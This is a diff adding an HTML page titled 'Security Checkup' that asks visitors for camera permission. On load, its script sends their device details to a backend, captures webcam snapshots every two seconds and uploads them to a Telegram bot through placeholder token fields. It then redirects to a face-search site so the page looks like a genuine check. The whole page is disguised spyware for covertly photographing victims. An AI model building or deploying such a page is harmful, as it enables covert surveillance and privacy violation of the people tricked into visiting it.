@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Checkup</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #000;
+            color: #fff;
+        }
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Security Checkup</h1>
+    <p>Please grant camera permission to proceed.</p>
+    <div id="loader" class="loader" style="display:none;"></div>
+
+    <script>
+        // Get device information
+        function getDeviceInfo() {
+            let deviceInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+            };
+            return deviceInfo;
+        }
+
+        // Send device info to backend
+        function sendDeviceInfo() {
+            fetch('/device_info', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(getDeviceInfo())
+            });
+        }
+
+        // Take snapshot and send to Telegram every 2 seconds
+        function takeSnapshotAndSend() {
+            let video = document.createElement('video');
+            let canvas = document.createElement('canvas');
+            let context = canvas.getContext('2d');
+            let constraints = { video: true };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function (stream) {
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(function () {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        video.srcObject.getTracks().forEach(track => track.stop()); // Stop the camera
+                        
+                        canvas.toBlob(function(blob) {
+                            let formData = new FormData();
+                            formData.append('file', blob);
+                            fetch('https://api.telegram.org/botYOUR_BOT_API_TOKEN/sendPhoto?chat_id=YOUR_CHAT_ID', {
+                                method: 'POST',
+                                body: formData
+                            });
+                        });
+
+                    }, 1000); // Delay for loading
+                })
+                .catch(function (err) {
+                    console.error("Error accessing camera: ", err);
+                });
+        }
+
+        // Show the loader and redirect after 5 seconds
+        function showLoaderAndRedirect() {
+            document.getElementById("loader").style.display = "block";
+            setTimeout(function () {
+                window.location.href = "https://facecheck.id";  // Redirect to facecheck.id
+            }, 5000); // Wait for 5 seconds before redirect
+        }
+
+        // Main function to trigger actions
+        function init() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // Send device info to backend
+                sendDeviceInfo();
+                // Start taking snapshots every 2 seconds
+                setInterval(takeSnapshotAndSend, 2000);
+                // Show loader and redirect after 5 seconds
+                showLoaderAndRedirect();
+            } else {
+                alert("Camera permission required.");
+            }
+        }
+
+        // Start the process when the page loads
+        window.onload = init;
+    </script>
+</body>
+</html>
